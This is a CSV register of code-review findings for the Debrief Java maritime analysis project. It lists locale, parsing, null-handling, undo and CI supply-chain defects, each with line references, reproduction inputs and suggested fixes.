CR-142,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.FlatFile,FlatFileExporter,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/FlatFile/FlatFileExporter.java,bug,locale-parsing,Medium,High,verified,"STRAND flat-file export uses default-locale DecimalFormat, emitting comma dec...","collateLine and getBody2 create DecimalFormat('0.00'), ('0.0'), ('0'), ('0.####') and ('0.########') without locale symbols (L437-L439; L712-L713). On a JVM whose default locale uses a comma decimal separator (verified: Locale.GERMANY formats 1234.5 as '1234,50') the tab-separated numeric columns contain commas and the external consumer of the STRAND scenario report misreads or rejects the file. Msd_Depth (L925) is additionally written with Double.toString, giving a mixed style.",L437-L439; L712-L713; L925,Run the flat-file (STRAND) export on a workstation with a German/French/Spanish locale,Build every DecimalFormat with DecimalFormatSymbols(Locale.UK) (or Locale.ROOT) and format Msd_Depth the same way.,S,grep-able,-,
CR-143,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.FlatFile,OTH_Importer,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/FlatFile/OTH_Importer.java,bug,locale-parsing,Medium,High,verified,OTH-GOLD month names parsed with default-locale GMTDateFormat; every POS date...,"dateFor parses the month token with GMTDateFormat('MMMyy') and 'ddHHmm'Z'MMMyy' (L482-L484; L496-L497); GMTDateFormat(String) calls SimpleDateFormat(pattern) with the default locale (GMTDateFormat.java L41). Verified: with a German default locale 'AUG'/'OCT'/'MAR' tokens throw ParseException. dateFor logs and returns null, and produceFix (see the null-deref row) still creates a FixWrapper with a null time, so on a non-English JVM every OTH position is undated and the import subsequently fails.",L469-L506,OTH-GOLD file with 'POS/112313Z1/AUG/4612N34/02122W7//...' lines imported on a French-locale JVM,"Use the GMTDateFormat(pattern, Locale.ENGLISH) constructor (note: that overload currently forgets setLenient(false)).",S,Requires following GMTDateFormat to see which constructor applies the default locale.,-,
CR-144,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.FlatFile,OTH_Importer,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/FlatFile/OTH_Importer.java,bug,null-deref,Medium,High,candidate,"produceFix never returns null and POS-before-CTC dereferences a null track, c...","produceFix (L674-L682) wraps whatever locationFrom/dateFor returned, even null location or date, so the 'wrapped != null' guard at L738 is always true; a POS line with a bad date leads to thisDate==null and thisDate.getDate() at L747 (or TrackWrapper.addFix with a null DTG) throwing NullPointerException. A POS line that precedes any CTC line dereferences thisTrack==null at L733. readOTHData declares only IOException, so these RuntimeExceptions abort the import instead of being logged like the other field errors.",L674-L682; L729-L751,"OTH file whose first data line is 'POS/...' with no preceding 'CTC/...' line, or a POS line with month 'ABC'","Return null from produceFix when loc or date is null (and log), and skip POS lines while thisTrack is null with an ErrorLogger message.",S,Needs to see that the null guard is vacuous because the callee cannot return null.,-,
CR-145,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.NMEA,ImportNMEA,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/NMEA/ImportNMEA.java,bug,degenerate-input,Medium,High,verified,"Corrupt $POSL sentence crashes NMEA import (NPE on first OS_POS, SIOOBE in de...","In the OS_POS branch parseOwnship may return null (typePattern is looser than osPattern), but state.location is dereferenced at L837 before the null check at L841 whenever origin is still null, so a truncated or malformed first position sentence throws NullPointerException. degsFor (L453-457) assumes a '.' is present; the lat/long regex groups use an unescaped '.' so '3409x5794,N' passes the regex and text.substring(0, dec-2) throws StringIndexOutOfBoundsException (verified). Neither is caught (only IOException at L881), so the whole import fails.",L453-L457; L833-L845,"NMEA log whose first '$POSL,POS,GPS,...' line is truncated after the source field, or contains '3409x5794,N' in the latitude field","Check state for null before using it; escape the decimal point in the regexes (\\.) and validate indexOf('.') >= 2 in degsFor, skipping the sentence with a logged warning.",S,Needs ordering analysis of the null check vs use and regex-vs-substring assumptions.,-,
CR-146,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.NMEA,ImportNMEA,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/NMEA/ImportNMEA.java,algorithm-correctness,division-by-zero,Medium,Medium,candidate,Ownship speed computed from consecutive fixes with identical timestamps gives...,"Position sentences carry no time; the date comes from the last $POSL,DZA line. With osFreq=0 storeLocation accepts a fix whenever date >= lastTime+0, so several POS/POS2 sentences between two DZA lines get the same Date. fixFor then divides travelled distance by timeDiffMillis==0 (L486-487), storing speed Infinity (or NaN when distance is also 0) in the FixWrapper; course from a zero-length vector is also arbitrary. These values propagate into the track and any analysis using speed.",L467-L497; L645-L684,"Log where the GPS emits two '$POSL,POS,GPS,...' sentences between consecutive '$POSL,DZA,...' timestamps, imported with ownship frequency 0",When timeDiffMillis == 0 reuse the previous fix's course/speed (or skip the duplicate-time fix).,S,Needs to combine the DZA-driven timestamp model with the resampling predicate to see equal timestamps are reachable.,-,
CR-147,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.PCArgos,ImportArgosFix,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/PCArgos/ImportArgosFix.java,algorithm-correctness,sign-error,Medium,Low,candidate,"Argos x/y to bearing uses atan2(y, x) while sibling PMRF importer uses atan2(...","ImportArgosFix converts range-data x/y offsets to a WorldVector with brg = Math.atan2(y, x) (L175), i.e. a mathematical angle from the x axis, whereas ImportPMRFFix (L222, annotated 'IM experimenting') uses Math.atan2(x, y), the compass bearing from north expected by WorldVector. For east/north offsets one of the two mirrors every position about the NE diagonal (bearing b becomes 90-b). Since both feed WorldVector(brg, range, depth) and WorldLocation.add, the two importers cannot both be right.",L169-L178,"Argos .rao line with x=1000, y=0 (due east of origin) is plotted due north","Confirm the coordinate convention of the .rao format and use atan2(x, y) for east/north offsets in both importers; add a unit test with a known offset.",S,Requires comparing two sibling importers and knowing WorldVector's bearing convention.,-,
CR-148,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Replay,ImportBearing,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Replay/ImportBearing.java,bug,off-by-one,Medium,Medium,candidate,;BRG: importer reads five latitude tokens and exporter writes an incompatible...,"readThisLine reads latDeg, latMin, latSec and then reads latMin and latSec again (L206-L211), consuming five tokens for the latitude, so for a well-formed 'D M S H' latitude the hemisphere letter is fed to readThisDouble, ParseException is caught and null returned (the line is silently dropped). exportThis (L141-L158) writes 'BD start end' with no date/time and no orientation/length, which readThisLine cannot parse either, so bearing lines never round-trip. No sample data or docs in the repository contain ';BRG:', suggesting the path is untested.",L205-L233; L141-L158,';BRG: @A 951212 050200 22 10 53.54 N 21 45 14.20 W 45.0 5000 my bearing' is silently ignored,"Delete the duplicated latMin/latSec reads and make exportThis emit symbology, DTG, start location, orientation and length.",S,Duplicate-statement bug only visible by reading the token sequence against the format.,-,
CR-149,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Replay,ImportEllipse,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Replay/ImportEllipse.java,bug,nondeterminism,Medium,High,candidate,Exporting an untimed ellipse stamps it with the current wall-clock time,"exportThis substitutes new HiResDate(new Date()) when the shape has no start DTG (L201-L207) and writes it into the ;ELLIPSE: line. On re-import the ellipse acquires a start time equal to the export moment, so a permanently visible ellipse becomes time-filtered and disappears from plots of the original data period. The exported colour is also hard-coded 'BD' (colour lost), as in ImportCircle/ImportRectangle/ImportWheel exporters.",L190-L221,"Export a REP containing an ellipse created without a time, then import it into a 1995 dataset","Write a NULL/absent date token that readThisLine accepts (as ImportSensorArc does), or refuse to fake a date; export the real colour via replaySymbolFor.",S,Needs the reader side to see that an invented date changes visibility semantics.,-,
CR-150,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Replay,ImportLine,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Replay/ImportLine.java,bug,string-parsing,Medium,High,candidate,;LINE: end point uses Integer.parseInt while start point accepts decimals; de...,"extractStart parses the first location with MWCXMLReader.readThisDouble (decimal degrees/minutes allowed, L102-L121), but the end location parses degrees and minutes with Integer.parseInt (L216-L217, L229-L235). A line such as ';LINE: @B 20.5 0 0 N 21 10 0 W 22.5 0 0 N 21 10 0 W x' throws NumberFormatException, which escapes readThisLine and aborts the whole REP import at that line ('Number format error'), while the same value in the start position is accepted.",L214-L240,';LINE: @B 20 50 0 N 21 10 0 W 22.5 0 0 N 21 10 0 W test line',Use readThisDouble for the end-point degrees and minutes (or share extractStart for both ends).,S,Inconsistency between two halves of one parser; grep for parseInt would give many false positives.,-,
CR-151,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Replay,ImportPlanningLegOrigin,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Replay/ImportPlanningLegOrigin.java,bug,locale-parsing,Medium,High,verified,Planning legs exported with default-locale DecimalFormat; comma decimals are ...,"exportThis formats depth, range, duration, speed and course with new DecimalFormat('0.######') using the platform default locale (L206; L223; L269-L273; L296). Verified: with Locale.GERMANY 12.5 formats as '12,5'. The importers read these fields with MWCXMLReader.readThisDouble, which (see the MWCXMLReader row) parses '12,5' as 12.0, so on a non-English workstation a planning track survives export/import with truncated ranges, speeds and courses and no error.",L206; L223; L269-L273; L296,Export a planning track with leg speed 12.5 kts on a German-locale JVM and re-import it,Construct the DecimalFormat with DecimalFormatSymbols(Locale.UK) as DebriefFormatLocation does.,S,"grep-able (new DecimalFormat without symbols), but the silent-truncation consequence depends on the reader.",-,
CR-152,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Replay,ImportReplay,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Replay/ImportReplay.java,bug,degenerate-input,Medium,High,candidate,Unchecked casts and substring(6) on user-controlled names throw uncaught runt...,"Track names from the file are used to look up layers and cast without instanceof: L1916 (TrackWrapper) getLayerFor(theTrack) throws ClassCastException when a fix's track name equals an existing non-track layer such as 'Annotations' or 'Narratives'; L2127 does the same for ;SENSOR: lines and L2228 casts to DynamicShapeLayer for dynamic shapes. processContactWrapper (L1710) and processDynamicShapeWrapper (L1783) call trackName.substring(6) on unknown track names shorter than 6 characters, throwing StringIndexOutOfBoundsException. canImportThisFile (L1314-1315) throws on a name without '.'. importRep only catches NumberFormat/IO/NoSuchElement/Parse exceptions (L1618-L1630), so these propagate and the import fails without a readError dialog.",L1314-L1315; L1710; L1783; L1916; L2127; L2228; L1618-L1630,REP file with a ';TEXT:' line (creates layer 'Annotations') followed by a fix line whose track is named Annotations; or ';TMA_POS: 030211 120312 CAR S@ ...' where no track 'CAR' exists,"Guard with instanceof and length checks, report via readError, and add a catch(RuntimeException) in importRep that routes to handleException.",M,Requires tracing which layer types can share the Layers namespace and the exception filter in importRep.,-,
CR-153,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Replay,ImportTimeText,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Replay/ImportTimeText.java,bug,silent-data-loss,Medium,High,candidate,"Exported ;TIMETEXT: line omits the date/time and colour, so it cannot be re-i...","exportThis writes ';TIMETEXT: BB <location><label>' (hard-coded symbology, no DTG, no space before the label) whereas readThisLine expects symbology, date, time, then location (L165-L169). Re-importing an exported file makes DebriefFormatDateTime.parseThis receive the latitude degrees as the date and throws ParseException, which aborts the whole REP import with a 'Date format error'. The label's start time and colour are lost.",L117-L129,"Export a layer containing a timed label to REP, then import the resulting file","Emit replaySymbolFor(colour, symbol), then DebriefFormatDateTime.toStringHiRes(getStartDTG()), then the location and a space-separated label, mirroring ImportPeriodText.exportThis.",S,Export/import asymmetry only visible by comparing the two methods.,-,
CR-154,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.ais,AISPositionA,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/ais/AISPositionA.java,bug,off-by-one,Medium,High,candidate,Length guard checks 137 bits but decoder reads bits 137-143; truncated payloa...,"decode() rejects strings shorter than 137 bits (L136-138) but then reads decBytes.substring(137, 143) for the timestamp (L185). A payload of 23 six-bit chars (138 bits) passes the guard and throws StringIndexOutOfBoundsException, which is not an AISParseException and so is not caught by AISParser.parse (L239-250); the whole AIS import aborts. AISPositionB has the same defect (guard <133 at L123-124, reads 137-143 at L155).",L133-L138; L185-L186,"Line '!AIVDM,1,1,,A,15RTgt0PAso;90TKcjM8h6g,0*XX' (23-char payload with a valid checksum)",Require length >= 168 for types 1/2/3 and 18 (or >= 143 at minimum) and throw AISParseException; catch RuntimeException in AISParser.parse and treat as a bad line.,S,Constant mismatch between a guard and a later substring index; needs reading both.,-,
CR-155,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.ais,AISPositionExtB,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/ais/AISPositionExtB.java,algorithm-correctness,time-handling,Medium,High,candidate,Type-19 position report timestamp is the import wall-clock instead of the mes...,"decode() sets msgTimestamp to Calendar.getInstance(UTC).getTimeInMillis() (L185-186) rather than decoding the 6-bit timestamp at bits 133-138 as AISPositionA/B do. ImportAIS.storeThis uses getMsgTimestamp().getSeconds() to place the fix relative to the last base-station time, so every Class-B extended report is timed by whatever second the analyst happened to import at, giving nondeterministic and wrong fix times.",L125-L189,"AIS log containing type-19 ('!AIVDM,...,C...') sentences",Decode bits 133-138 into secs and build the Timestamp exactly as AISPositionB does.,S,Requires knowing the AIS bit layout and how ImportAIS consumes getMsgTimestamp.,-,
CR-156,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.ais,ImportAIS,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/ais/ImportAIS.java,bug,logic-error,Medium,High,candidate,"Vessel-name rename never finds the nested MMSI track, producing two tracks pe...","Position fixes are stored in LightweightTrackWrappers nested inside the 'AIS Tracks' BaseLayer (storeFix L431-448), but when a type-5 static message arrives importThis looks the track up with _layers.findLayer(''+mmsi) (L354), which Layers.findLayer(String) implements non-recursively over top-level layers only (Layers.java L839-851), so it is always null and no rename happens. From then on nameFor() returns the vessel name, so later fixes go to a new track named e.g. 'LOLLAND' while earlier ones stay in track '564166000'. _nameLookups is also static, leaking names across imports/sessions.",L344-L358; L369-L379; L431-L452,AIS log where a vessel's position reports precede its first type-5 static-data message (the normal case),Look the track up inside the 'AIS Tracks' layer (parent.find(''+mmsi)) and rename it; make _nameLookups an instance field.,S,Needs the Layers.findLayer recursion semantics plus the storage layout to see the lookup can never succeed.,-,
CR-157,A10,org.mwc.cmap.plotViewer,org.mwc.cmap.plotViewer.actions,ExportRTF,org.mwc.cmap.plotViewer/src/org/mwc/cmap/plotViewer/actions/ExportRTF.java,bug,thread-safety,Medium,High,candidate,MessageDialog opened from the export Job thread,"executeInJob runs inside ProgressMonitorDialog.run(true,...) i.e. a non-UI thread (CoreEditorAction L58-L68). On write failure ExportRTF calls MessageDialog.openError directly, an SWT invalid-thread-access exception, whereas the sibling ExportWMF wraps the same call in Display.syncExec (ExportWMF L114-L120). Also the WMF is read with new byte[(int) file.length()].",L124-L128; L152,Export RTF to a read-only or missing target directory so WriteMetafile.isWritable() is false,Wrap the dialog in Display.getDefault().syncExec as ExportWMF does.,S,"Needs knowledge that executeInJob runs off the UI thread, by reading CoreEditorAction.",-,
CR-158,A10,org.mwc.cmap.plotViewer,org.mwc.cmap.plotViewer.actions,ZoomIn,org.mwc.cmap.plotViewer/src/org/mwc/cmap/plotViewer/actions/ZoomIn.java,bug,division-by-zero,Medium,High,candidate,Zoom-out drag with zero width or height divides by zero (integer maths),"run() proceeds when either |width| or |height| exceeds JITTER, then in the zoom-out branch computes screen area / (res.height*res.width) in integer arithmetic. A drag that is purely horizontal or vertical gives a zero product and ArithmeticException; otherwise the integer division truncates the ratio before sqrt so the zoom-out scale is coarse (e.g. 13 instead of 13.33).",L144; L168-L181,In Zoom mode drag up-left with the mouse kept on the same pixel row (dy=0) for more than 9 pixels and release,Require both dimensions non-zero (or use && with JITTER) and compute the ratio in double precision.,S,Needs to see that the OR guard does not protect the product used as divisor.,-,
CR-159,A10,org.mwc.cmap.plotViewer,org.mwc.cmap.plotViewer.editors.chart,SWTChart,org.mwc.cmap.plotViewer/src/org/mwc/cmap/plotViewer/editors/chart/SWTChart.java,bug,resource-leak,Medium,Medium,candidate,Layer buffer Image and GC leak when a layer's paint throws; unguarded parseIn...,"In paintMe the per-layer Image and GC are created and only disposed after thisLayer.paint(ca) returns; any exception from a layer painter (common with malformed data) leaks both native handles on every repaint and leaves _repainting reset only via finally. paintBackground parses CHART_TRANSPARENCY with Integer.parseInt with no catch, so a corrupt preference value aborts painting entirely.",L1057-L1086; L942-L946,A layer whose paint() throws (e.g. shape with null bounds) with buffered layers enabled; repeatedly zoom/pan,Dispose GC/Image in a finally block around the paint; catch NumberFormatException and fall back to 255.,S,Exception-path resource accounting across 30 lines.,-,
CR-160,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,ConvertAbsoluteTmaToRelative,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/ConvertAbsoluteTmaToRelative.java,bug,logic-error,Medium,High,candidate,Unchecked cast of mixed selection and 'after' segment only detected when 'bef...,"The validation loop only inspects items that are CoreTMASegments, so a FixWrapper or plain TrackSegment in the selection passes and is then cast to AbsoluteTMASegment (ClassCastException while building the menu). Separately, 'after' is only assigned inside 'if (before != null)', so an absolute segment that is followed but not preceded by a relative leg is reported as unconvertible even though the later code explicitly handles the after-only case.",L501-L523; L533; L546-L555; L559-L583,Select an AbsoluteTMASegment together with one of its FixWrappers; or a track whose first segment is absolute and second is relative,Reject non-AbsoluteTMASegment items in the first loop; evaluate the 'after' test independently of 'before'.,S,Requires reading control flow of two loops; the after/before asymmetry is a semantic bug.,-,
CR-161,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,ConvertTrackToLightweightTrack,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/ConvertTrackToLightweightTrack.java,bug,silent-data-loss,Medium,Medium,candidate,Conversion drops sensors/solutions/segments without warning; undo restores at...,"ConvertIt copies only the position iterator into the LightweightTrackWrapper and removes the TrackWrapper from Layers, so sensor cuts, TMA solutions, dynamic shapes and segment structure vanish with no confirmation and are gone on save. The FixWrapper instances are shared between old and new tracks. undo() re-adds the old track with addThisLayer (losing any nested position) and does not fire an extended event so the Outline is not refreshed.",L92-L124; L138-L160,Track with sensors and a TMA solution -> Convert to lightweight track in Shapes; save; reopen,Warn (or refuse) when the track has sensors/solutions/multiple segments; fire layers extended in undo.,M,Needs domain knowledge that TrackWrapper holds more than positions.,-,
CR-162,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,CopyBearingsToClipboard,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/CopyBearingsToClipboard.java,algorithm-correctness,nondeterminism,Medium,High,candidate,Bearing list keyed by HashMap: first/last DTG and paste order are arbitrary,"BearingList extends HashMap<HiResDate,Doublet>. generatePasteAction takes dates[0] and dates[len-1] of keySet().toArray() as the list's start/end to decide overlap with the target track, but HashMap iteration order is unrelated to time, so the overlap test uses two arbitrary timestamps and can wrongly hide or offer the paste action; an empty BearingList also throws ArrayIndexOutOfBounds at dates[0]. createPointsFor iterates the same unordered keySet.",L93-L117; L247; L723-L728,"Copy a TMA track as offsets, then right-click a host track whose period overlaps only part of the copied list; menu presence depends on hash order","Use a TreeMap<HiResDate,Doublet> (or sort the keys) and guard against empty lists before computing the period.",S,Needs to know HashMap has no ordering and that the code relies on positional first/last semantics.,-,
CR-163,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,CopyBearingsToClipboard,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/CopyBearingsToClipboard.java,bug,logic-error,Medium,High,candidate,Paste of several bearing lists creates N tracks but Undo removes only the last,"PasteBearingData.execute loops over every BearingList creating and adding a new TrackWrapper each time, but keeps only the last one in the single field _newTrack. undo() removes just that one, leaving the other pasted tracks in the plot with the operation marked as undone.",L306-L318; L323-L332,"Copy two TMA tracks together (multi-select) as offsets, paste onto a host track, then Undo",Keep a List<TrackWrapper> of created tracks and remove them all in undo(); fire layers extended in undo.,S,Requires matching the loop in execute against the single-field undo.,-,
CR-164,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,ExportTrackAsCSV,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/ExportTrackAsCSV.java,bug,string-parsing,Medium,High,candidate,CSV writer does not escape embedded quotes; empty track NPE,"write(String) wraps free text in double quotes without doubling embedded quotes, so a unit name, purpose or distribution statement containing a quote produces a malformed record that RFC 4180 readers mis-split. outputStrings dereferences subject.getEndDTG() which is null for a track with no positions; getFileName calls tidyMe on provider strings that may be null.",L282-L284; L143-L144; L118-L126,"Export Track to CSV with Distribution Statement 'Release to ""UK"" only'",Escape quotes by doubling them (or use commons-csv CSVPrinter which is already a test dependency) and guard empty tracks.,S,grep-able,-,
CR-165,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateInfillSegment,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateInfillSegment.java,bug,logic-error,Medium,High,candidate,Selection validation overwritten per item; non-segment items reach unchecked ...,"In generate(), canDo is reassigned on every iteration instead of accumulated, so a non-TrackSegment earlier in the selection is masked by a later valid segment; only parentLayers[0] and [1] are compared for a common parent. execute() then casts _segments[i] to TrackSegment (L129-L130), giving ClassCastException part-way through, after some infills may already have been added.",L1032; L1035-L1042; L129-L130,"In the Outline, ctrl-click a SensorWrapper of a track and then two of that track's TMA segments, choose Generate infill segments",Use canDo &= (editable instanceof TrackSegment && !isEmpty) and check every parentLayers[i] equals parentLayers[0].,S,A reviewer has to notice the assignment inside the loop should be a conjunction.,-,
CR-166,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateTMASegmentFromCuts,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateTMASegmentFromCuts.java,bug,degenerate-input,Medium,Medium,candidate,Cuts outside host track period silently dropped; empty result NPEs in execute,"TMAfromCuts.trimToHost silently discards every cut whose DTG is outside the host track's fix period, using only cuts[0]'s host, with no message to the analyst. If all cuts fall outside (sensor data that extends beyond the positional data) _items is empty, RelativeTMASegment is empty and getTrackNameFor calls _newTrack.getStartDTG().getDate() on null. The 'selected cuts' path also passes firstContact.getRange() (possibly null) to the wizard while the 'all cuts' path defaults it to 6nm.",L666-L684; L699; L742-L749; L777-L779; L905-L907 vs L950-L951,Sensor with cuts timestamped after the last ownship fix; select those cuts -> Generate TMA solution from selected cuts -> Finish,"Report how many cuts were trimmed, abort with a message when none remain, and apply the same null-range default on both wizard paths.",S,Needs to follow the trimmed array through to the later null dereference.,-,
CR-167,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateTMASegmentFromOwnshipPositions,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateTMASegmentFromOwnshipPositions.java,bug,null-deref,Medium,Medium,candidate,items[] may contain nulls and selection order is assumed chronological,"In generate(), items[i] is only set when the fix's parent is a TrackWrapper; otherwise allGood stays true and the slot remains null, so TMAfromPositions.execute dereferences _items[0] or _items[len-1]. execute also takes start from _items[0] and end from the last item, assuming the selection array is time-ordered; a reversed order produces an inverted (empty) AbsoluteTMASegment and getStartDTG() NPE at L126-L127.",L186-L208; L114-L117; L126-L127,Select FixWrappers from a LightweightTrackWrapper (not a TrackWrapper) and run Generate TMA solution from selected positions,Set allGood=false when the parent is not a TrackWrapper; sort items by DTG before use.,S,Requires noticing the missing else branch inside the validation loop.,-,
CR-168,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateTrack,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateTrack.java,bug,null-deref,Medium,Medium,candidate,"Convert layer to track: undo NPE when nothing generated, null DTG fixes, Colo...","undo() iterates _newTracks which stays null when no layer yielded a track. generateTrackFor builds Fix objects with sw.getStartDTG() which may be null for LineShapes without a DTG, producing fixes with null time that break time-ordered collections later. label.getColor() != trackColor compares Colors by reference so fixes are needlessly given individual colours.",L109-L122; L230-L233; L212; L235,Layer containing a LabelWrapper without a time plus a LineShape without start/end DTG; Convert layer to track then Undo,"Guard _newTracks in undo, skip or default shapes lacking a DTG (with a warning), use equals() for colours.",S,Needs to trace when _newTracks stays null and where a null DTG ends up.,-,
CR-169,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,RainbowShadeSonarCuts,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/RainbowShadeSonarCuts.java,bug,logic-error,Medium,High,candidate,Undo of shading resets cuts to default colour instead of restoring prior colours,"ShadeCutsOperation.undo() runs CLEAR_SHADE, which calls resetColor() on every cut, so any custom colour the analyst had already applied to individual cuts (or a previous shading) is lost rather than restored. Also _delta is computed in whole seconds and execute() silently returns OK_STATUS when _delta<=0, so cuts spanning under one second are not shaded and no message is shown; hue is quantised to seconds.",L76; L102; L128-L136; L151-L154,"Manually colour three cuts red, apply Shade in rainbow colors to the sensor, then Undo",Record each cut's colour (getColor/hasCustomColor) in execute and restore in undo; compute delta in micros as double.,S,Undo-fidelity reasoning; not detectable by pattern matching.,-,
CR-170,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,RemoveTrackJumps,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/RemoveTrackJumps.java,algorithm-correctness,division-by-zero,Medium,Medium,candidate,Duplicate timestamps produce Infinity/NaN offsets that are applied to positions,"Leg() divides by (jumpTime - prevTime) and offsetFor divides by (endTime - startTime); two fixes with identical DTGs give Infinity/NaN range in the offset vector which applyOffsets then adds to every fix location in the leg, silently corrupting positions (undo still works since originals are stored). getLegs also calls iter.next() on a possibly empty collection and generate casts every subject to FixWrapper when only the first was checked.",L97-L101; L127-L129; L240; L284; L372,Track segment where two consecutive fixes share the same DTG followed by a speed jump; Remove jumps for selected track,"Skip legs with zero time delta (or report), guard empty collections, and validate all subjects are FixWrappers.",S,Requires following the ratio into WorldVector construction and setLocation.,-,
CR-171,A10,org.mwc.debrief.core,org.mwc.debrief.core.loaders,CoreLoader,org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/CoreLoader.java,bug,swallowed-exception,Medium,High,candidate,All import failures logged then 'Successfully loaded' reported; suspend flag ...,"loadFile catches InvocationTargetException/InterruptedException/IOException/Exception, logs them, then unconditionally logs 'Successfully loaded ... file' and calls listener.complete(), so a corrupt file appears to succeed to callers and the log. layers.suspendFiringExtended(false) is called before the import (evidently meant to be true) so nothing is suspended and finally resets the same flag; if target has no Layers adapter, layers is null and the finally block NPEs.",L76; L82; L88-L102,Any .rep that makes ImportReplay throw (e.g. truncated line) opened via the plot editor,"Track success in a boolean, only log success and call complete on success, pass true to suspendFiringExtended, and null-check layers.",S,grep-able,-,
CR-172,A11,.github,-,codeql-analysis.yml,.github/workflows/codeql-analysis.yml,ci-workflow,dead-code,Medium,High,verified,"CodeQL workflow is disabled and could not run anyway (v1 actions, Autobuild v...","The GitHub Actions API reports this workflow's state as `disabled_inactivity` (last update 2022-11-24) with zero runs, so no CodeQL analysis has happened for years despite the file suggesting otherwise. Even re-enabled it would fail: github/codeql-action/init@v1, autobuild@v1 and analyze@v1 (L45, L56, L70) were removed by GitHub in January 2023, actions/checkout@v2 (L41) is Node 12 and deprecated, and Autobuild runs `mvn package` on `ubuntu-latest` with no setup-java (Tycho needs Java 11 and the win-64 JRE staging performed in main.yml), so the Java matrix entry would produce no database.",L26; L41; L45; L56; L70,Actions API: GET /repos/debrief/debrief/actions/workflows/codeql-analysis.yml -> state=disabled_inactivity; list runs -> total_count 0.,"Upgrade to codeql-action@v3 and checkout@v4, replace Autobuild with `build-mode: none` for Java (or an explicit setup-java 11 + `mvn -B -DskipTests package`), re-enable the workflow, and add it as a required check; or delete the file if CodeQL is not wanted.",M,"Confirming the workflow is inert required querying the live Actions state and reasoning about Autobuild against a Tycho build, not just reading the YAML.",-,
CR-173,A11,.github,-,main.yml,.github/workflows/main.yml,supply-chain,ssrf-or-unvalidated-url,Medium,High,candidate,Bundled Windows JRE zip is downloaded without any checksum verification,L156-157 `wget -q -O ... https://github.com/AdoptOpenJDK/openjdk11-binaries/releases/download/...zip` and contribs/msi/make_x64msi.sh L26 do the same; the archive is then unpacked straight into the shipped product (L166-169). No SHA-256 is checked although AdoptOpenJDK publishes one. Integrity rests entirely on TLS to github.com and on the (archived) AdoptOpenJDK org's release assets never being replaced; the result is cached for the lifetime of key `win-jre-11.0.5-10` (L150) so a single poisoned download persists across every build.,L152-157; L166-169; contribs/msi/make_x64msi.sh L26-28,Compromise or takeover of the archived AdoptOpenJDK/openjdk11-binaries release asset; every subsequent Windows release bundles it.,Download the matching .sha256.txt and run `sha256sum -c` before unzip; include the hash in the cache key.,S,grep-able.,-,
CR-174,A11,.github,-,main.yml,.github/workflows/main.yml,supply-chain,outdated-dependency,Medium,High,candidate,Third-party actions referenced by mutable tags; xvfb-action wraps the whole b...,"Every `uses:` is a floating major tag rather than a commit SHA: GabrielBB/xvfb-action@v1 (L176) runs the entire `mvn clean verify` and is an archived, unmaintained repository; softprops/action-gh-release@v2 (L311) receives the contents:write GITHUB_TOKEN and decides what is published; andstor/file-existence-action@v1 (L218) and bcomnes/cleanup-xvfb@v1 (L327) are small personal actions. A moved tag (as in the tj-actions/changed-files incident, CVE-2025-30066) executes attacker code inside the release job.",L55; L121; L123; L136; L147; L176; L184; L218; L254; L262; L270; L292; L311; L327,Upstream maintainer account compromise moves the `v1`/`v2` tag; next tag build publishes tampered assets.,Pin every action to a full commit SHA with a version comment and enable Dependabot `github-actions` updates; replace xvfb-action with `xvfb-run -a mvn ...` (xvfb is already apt-installed at L117) so no third-party action wraps the build.,S,"grep-able, though judging which actions sit on the privileged path needs the workflow read.",CVE-2025-30066,
